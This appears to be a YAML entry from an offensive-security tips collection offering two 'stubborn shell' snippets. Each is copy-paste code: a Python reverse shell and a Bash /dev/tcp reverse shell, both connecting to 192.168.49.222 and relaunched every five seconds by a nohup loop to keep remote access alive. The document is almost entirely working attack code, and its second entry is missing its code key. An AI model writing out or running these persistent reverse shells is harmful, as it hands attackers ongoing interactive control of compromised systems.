---
functions:
  ttp-tip:
    - description: Python-Linux stubborn shell
      code: |
        copy,paste

        cat > pyshell.py <<EOF
        import socket,subprocess,os,sys
        ip="192.168.49.222"
        port=80
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/bash","-i"])
        EOF
        nohup bash -c "while true; do python3 ./pyshell.py 2>/dev/null;sleep 5;done &"

    - description: Bash stubborn shell
        copy,paste

        cat > bashshell.sh <<EOF
        /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.49.222/8080 0>&1"
        EOF
        nohup bash -c "while true; do /bin/bash ./bashshell.sh;sleep 5;done &"
resources: |
  
---